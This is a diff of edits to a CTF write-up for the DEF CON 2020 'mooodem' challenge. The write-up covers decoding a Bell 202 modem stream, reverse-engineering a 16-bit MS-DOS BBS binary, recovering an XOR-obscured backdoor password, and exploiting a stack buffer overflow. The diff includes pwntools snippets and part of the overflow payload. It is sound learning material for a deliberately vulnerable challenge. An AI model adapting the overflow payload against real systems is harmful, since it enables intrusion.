@@ -13,7 +13,7 @@ Source: [https://github.com/o-o-overflow/dc2020q-mooodem-public](https://github.
 Tags: _pwn_ _rev_ _bof_ _rop_ _x86_ _8086_ _16-bit_ _MSDOS_ _real-mode_ _modem_ _signal_ _audio_
 
 
-### Summary
+## Summary
 
 I completed this wonderful, nostalgic-themed challenge 48 hours after the end of the competition (I have a hard time with _pencils down_ when I do not complete a challenge--they haunt me until I finish them).
 
@@ -23,12 +23,12 @@ Awesome.
 
 I grew up in the 70s/80s, still own an IBM 5160 (8088 4.77 MHz PC), dialed into countless BBSes (starting at 300 baud), ran my own BBS, and still do modem <strike>research</strike> archeology as part of my computer history studies.  You can imagine why _this is now my all-time favorite CTF challenge._ 
 
-This isn't a writeup, or a walkthrough, it's more of a journey.
+This isn't a writeup, or a walkthrough, it's more of a journey, possibly a fan letter.
 
 
-### Analysis
+## Analysis
 
-#### First Stage: Bell 202
+### First Stage: Bell 202
 
 In the summary I said this was the _easy part_, and for me it was.  I write and maintain similar projects ([c2t](https://github.com/datajerk/c2t) and [asciiexpress.net](https://asciiexpress.net)) and have run across [`minimodem`](http://www.whence.com/minimodem/) in my retro travels.  IOW, I knew exactly what to do.  At least, with this part.
 
@@ -141,7 +141,7 @@ socat tcp:$HOST:$PORT - | \
 > The problem with already knowing something (e.g. minimodem), is that you have preconceived notions of how to use it and do not always consider other options, esp. in the heat of competition.  Fuck me.
 
 
-#### Second Stage: The '80s
+### Second Stage: The '80s
 
 After entering your name, you are greeted and presented with the following menu:
 
@@ -158,7 +158,7 @@ Hmmmm.... I guess download `BBS.ZIP` and then try to figure out how to get autho
 > Tired of that Ray Goforth quote.  It is always the same first quote.
 
 
-#### Third Stage: BBS.ZIP
+### Third Stage: `BBS.ZIP`
 
 Downloading files requires nothing special:
 
@@ -185,9 +185,9 @@ Enjoy!
 
 This is basically the bulletin from _List Recent Bulletins_.  This file is structured name, date, text.  `QUOTES.TXT` is too long to show here, however it is structured one quote/line.  Worth remembering.
 
-All that's left is to download BBS.ZIP:
+All that's left is to download `BBS.ZIP`:
 
-```
+```python
 from pwn import *
 import os
 
@@ -208,11 +208,9 @@ def getsome(filename,p,n,d):
 	return
 
 p = remote('mooodem.challenges.ooo', 5000)
-
 os.system('/bin/echo -e "datajerk\nL\nF\n2" | minimodem -t -8 -f in1.wav 1200 ; ./wav2bin in1.wav in1.bin')
 r = open('in1.bin','rb').read()
 p.send(r)
-
 getsome('bout4.bin',p,878051716,0)
 ```
 
@@ -260,7 +258,7 @@ A 1.44MB floppy image.  Of course.
 -rwxrwxrwx  1 root  root   9432 May 31  1994 SYS.COM
 ```
 
-Wait, what this `FLAG.TXT`:
+_Wait, what this `FLAG.TXT`:_
 
 ```
 OOO{not the real flag}
@@ -269,7 +267,7 @@ OOO{not the real flag}
 Ok, time to look at `BBS.EXE`.
 
 
-#### Forth Stage: The vulns
+### Forth Stage: The vulns
 
 This is as far as I got with more than 24 hours left in the CTF.
 
@@ -347,7 +345,7 @@ This setup is not unlike remote GDB except for the GDB part.  It was pretty pain
 > I could not get DOSEMU working with `dosdebug` in a VM with a newer Linux.  The lax memory protections of the 2.4 kernels have either be removed or need to be enabled somehow.  Powering up the ol' '94 was really no big deal.
 
 
-##### Load up in Ghidra
+#### Load up in Ghidra
 
 Ghidra will error with:
 
@@ -367,12 +365,12 @@ Reading through this was taking too long.  Debugging with DOSEMU/`dosdebug` was 
 > BTW, I've not completely abandoned the notion of using DOSEMU/`dosdebug` in the future.  I think with a bit of scripting it could be a very nice tool, and unlike GDB, it can actually disassemble i8086 correctly.
 
 
-##### Game over, time's up
+#### Game over, time's up
 
 About 40 minutes after the end of the CTF UnblvR posted in one of the OTA slack channels that he was using QEMU/GDB.  _JFC, I forgot that was an option._  The next day I probed for more info and he mentioned something about a real-mode GDB script.  After a bit of Googling, it was clear, how to gear up and take a 2nd run at this.
 
 
-##### Finally, the tools I've been looking for...
+#### Finally, the tools I've been looking for...
 
 I'm running the following three scripts in three discrete windows, executed in this order:
 
@@ -387,13 +385,13 @@ xdotool windowmove --sync $WID 1910 885 2>/dev/null
 wait
 ```
 
-This boots the `BBS.IMG` floppy image and redirects the DOS serial port to named pipes.  The commands after `qemu-system-i386` just move the console window to the same location on my desktop so I can avoid using a <strike>mouse</strike> trackpad as much as possible.  I could have ran headless like I do when I use QEMU for cross-build systems or perhaps with curses, but I didn't want to lose any possible leak from the console, OTOH having it in a terminal with could preserve all characters.  Anyway, unimportant, nothing is leaked to the console.
+This boots the `BBS.IMG` floppy image and redirects the DOS serial port to named pipes.  The commands after `qemu-system-i386` just moves the console window to the same location on my desktop so I can avoid using a <strike>mouse</strike> trackpad as much as possible.  I could have ran headless like I do when I use QEMU for cross-build systems or perhaps with curses, but I didn't want to lose any possible leak from the console, OTOH having it in a terminal could preserve all characters.  Anyway, unimportant, nothing is leaked to the console.
 
 ```
 cat pipe.out & cat > pipe.in
 ```
 
-This is a script I call `fooodem.sh` (pronounced fauxdem), and provides a very nice interactive session for the BBS (all the screen shots were taken this way).  I also use this with pwntools when crafting and testing exploits.  This pairs nicely with `mooodem.sh` which is based on the OOO hacked up `minimodem`.
+This is a script I call `fooodem.sh` (pronounced fauxdem), and provides a very nice interactive session for the BBS (many of the screen shots were taken this way).  I also use this with pwntools when crafting and testing exploits.  This pairs nicely with `mooodem.sh` which is based on the OOO hacked up `minimodem`.
 
 > To be true to myself, in the end, I created a one-shot payload since that is how I would have solved this before the end of the CTF.
 
@@ -417,9 +415,9 @@ This unpauses QEMU and the action starts.
 I cannot tell you how happy I am.
 
 
-##### Getting started...
+#### Getting started...
 
-Before we move on we need to find the code segment (CS) for `BBS.EXE`, and I do not know how to do that except to stop execution while the MOOODEM banner is printing.  I used this same technique with `dosdebug` as well.  The good news is that it is very consistent with identical setups, e.g. with DOSEMU it was always 0xFA0, with QEMU it has always been 0xF94.  The other option is to set a breakpoint.  The former method worked just fine for me.
+Before we move on we need to find the code segment (CS) for `BBS.EXE`, and I do not know how to do that except to stop execution while the MOOODEM banner is printing.  I used this same technique with `dosdebug` as well.  The good news is that it is very consistent with identical setups, e.g. with DOSEMU it was always `0xFA0`, with QEMU it has always been `0xF94`.  The other option is to set a breakpoint.  The former method worked just fine for me.
 
 > Did I forget to mention that [i8086 is weird](https://en.wikipedia.org/wiki/X86_memory_segmentation)?  Man, you're in for a treat.  The i8086 has a 20-bit address bus, but only 16-bit addresses.  Instead of using bank switching, Intel decided to use "segments".  The short of it is your hardware address is `16 * $CS` + offset (what you think your address is).  If you're wonder if that can cause problems--well, _yes!_
 
@@ -444,7 +442,7 @@ Above is the output of my `new.txt` `context`.  Added is a vertical stack view, 
 Notice that CS is `0xF94`, this will be frequently used.  Also note that SS is `0x1EAF`.  We need this too.
 
 
-##### Welcome, trusted admin...
+#### Welcome, trusted admin...
 
 This is where I was early Saturday.  I had `BBS.EXE` in hand and more that 30 hours before the end of the CTF.
 
@@ -496,10 +494,10 @@ Continuing.
 
 Evil is upon us.  At a min, a budget cult.  The program crashed as well.
 
-Finally a breakthrough.
+Finally, a breakthrough.
 
 
-##### Backtracking
+#### Backtracking
 
 ![](png/trusted.png)
 
@@ -525,7 +523,7 @@ Starting from the bottom up you can see the highlighted `FUN_0000_e8d5` that we 
 
 Above that is a comparison that must pass for the "trusted" function to be called.  If I had to guess `FUN_0000_2391` is comparing two strings or arrays.
 
-And above that presume string `local_e` is getting the `xor` treatment with an argument of `0x8c`--looks like crypto.
+And above that I presume string `local_e` is getting the `xor` treatment with an argument of `0x8c`--looks like '80s crypto.
 
 `local_10 = 0xf48` is unchanged (what `local_e` is presumedly compared with).
 
@@ -549,10 +547,10 @@ Looks like budget cult OOO spec crypto to me, check if `0x8c` is the key:
 b'supersneaky2020'
 ```
 
-Finally a goddamned breakthrough.
+Finally, a goddamned breakthrough.
 
 
-##### Backdoor
+#### Backdoor
 
 Restarting the simulation and testing for `supersneaky2020`:
 
@@ -563,7 +561,7 @@ So `supersneaky2020` as a "name" does not appear to do anything, however from th
 Backdoor, unlocked.
 
 
-##### Create some bulletins, list some bulletins
+#### Create some bulletins, list some bulletins
 
 ![](png/bullet.png)
 
@@ -578,7 +576,7 @@ Crash!
 I tested this multiple times and it is consistent, with 1000 bytes it always crashes.
 
 
-##### Buffer Overflow
+#### Buffer Overflow
 
 First we need to find the _List Recent Bulletins_ function:
 
@@ -612,7 +610,7 @@ and then:
 
 The `ret` from the previous function and the three `push`es gives it away.  The `sub sp,0x18e` is also allocating a large chunk on the stack.  This is probably the buffer we are looking for.  I'd prefer to do this in Ghidra.
 
-Going back to Ghidra I right-clicked on the `0xe04c` address and selected _Disassemble_, then _Create Function_.  I should also mention that Ghidra could not open this file up with out error, I had to manually select the language as _x86 Real Mode 16_, even then, not everything was disassembled.  Fortunately it was possible to remedy this.
+Going back to Ghidra I right-clicked on the `0xe04c` address and selected _Disassemble_, then right-clicked again and selected _Create Function_.  Sanity restored.
 
 ![](png/listc.png)
 
@@ -631,7 +629,7 @@ real-mode-gdb$ print/x 1x/1s $4
 0x1f6c5:	"rb"
 ```
 
-Yep, its `fopen`-ish.  Assuming lines 19-23 is the error message if the open fails, and starting at line 26 the loop to read in the bytes with only EOF and a NULL to indicate end of line thus overflowing into the return address and beyond.
+Yep, its `fopen`-ish.  Assuming lines 19-23 is the error message if the open fails, and starting at line 26, the loop to read in the bytes with only EOF and a NULL to indicate end of line thus overflowing into the return address and beyond.
 
 > If you read the code, it looks like for each field (name, date, text) `local_106` is used as just `buf`.  This does not matter.
 
@@ -641,7 +639,7 @@ Looking at the disassembly function header `local_106` is `0x106` bytes above th
 
 All that is left to do it figure out what to, well do...
 
-Calling line 18 with `FLAG.TXT` seems like the obvious choice, but if you recall from way back when we looked at the floppy image `NOTES.TXT` is somewhat structured and I assume `FLAG.TXT` is just a single line.  Using the _Show Random Quote_ function may be a better option.  To find it and possibly other `fopen` functions from Ghidra I double-clicked on `FUN_0000_0a1d` (presumed `fopen`):
+Calling line 18 with `FLAG.TXT` seems like the obvious choice, but if you recall from way back when we looked at the floppy image `NOTES.TXT`, it is somewhat structured and the fake `FLAG.TXT` is just a single line.  Using the _Show Random Quote_ function may be a better option.  To find it and possibly other `fopen` functions from Ghidra I double-clicked on `FUN_0000_0a1d` (presumed `fopen`):
 
 ![](png/fopen.png)
 
@@ -654,7 +652,7 @@ real-mode-gdb$ x/s $5
 0x1f7e6:	"ab+"
 ```
 
-Clearly this is the _Create New Bullentin_ function.  That leaves `0xe97c`:
+Clearly this is the _Create New Bullentin_ function, so that leaves `0xe97c`:
 
 ![](png/quotec.png)
 
@@ -682,7 +680,7 @@ Yep.
        0000:e98c e8 8e 20        CALL       FUN_0000_0a1d
 ```
 
-From the disassembly it looks like we have to put pointers to `FLAG.TXT` and `rb` on the stack and then call `0xe98a` (the first instruction after the args are pushed).
+From the disassembly it looks like we have to push pointers to `FLAG.TXT` and `rb` on the stack and then call `0xe98a` (the first instruction after the args are pushed).
 
 The problem is that `FLAG.TXT` isn't in memory, at least not statically like all the other strings so far.
 
@@ -700,7 +698,7 @@ real-mode-gdb$ print/x 0x20472 - 16 * 0x1eaf
 $1 = 0x1982
 ```
 
-`1982`, am I being trolled?  How cool is that?  Well, no so cool.  That value didn't work and in the interest of time I'm not going to share how much time I lost on that.  Then I remembered the lesson learned when I was trying to match up the formatting string `%s` with its address--there were multiple instances of `%s`.  (BTW, I omitted my `%s` adventure because this is already too long).
+`1982`, _am I being trolled?  How cool is that?_  Well, no so cool.  That value didn't work and in the interest of time I'm not going to share how much time I lost on that.  Then I remembered the lesson learned when I was trying to match up the formatting string `%s` with its address--there were multiple instances of `%s`.  (BTW, I omitted my `%s` adventure because this is already too long).
 
 Try harder:
 
@@ -746,7 +744,7 @@ The return address is at `0xff8c`.
 Analysis complete.
 
 
-### Exploit
+## Exploit
 
 ```python
 #!/usr/bin/python3
@@ -835,7 +833,9 @@ To create `in1.bin` using the stack (second method):
 ```python
 #!/usr/bin/python3
 
-payload  = 0x106*b'A'
+payload  = b''
+payload += b'datajerk\nsupersneaky2020\nC\n'
+payload += 0x106*b'A'
 payload += p16(0xe98a) # quote function
 payload += p16(0xff8c + 2 + 2 + 2) # return address, pointer to file, pointer to rb, then "FLAG.TXT"
 payload += p16(0xbd5) # rb
@@ -855,7 +855,7 @@ Output:
 
 ![](png/oneshotlive.png)
 
-You'll notice that the MOOODEM banner is missing, that is because the payload was being sent while the banner was being sent and nothing was catching the banner while the payload was transmitting.
+You'll notice that the MOOODEM banner is missing, that is because the payload was being sent while the banner was being sent and nothing was catching the banner while the payload was transmitting (remember is have two modems).
 
 Had I completed this on time, this last method is what I would have used, since that is what I had working before _pencils down_.
 
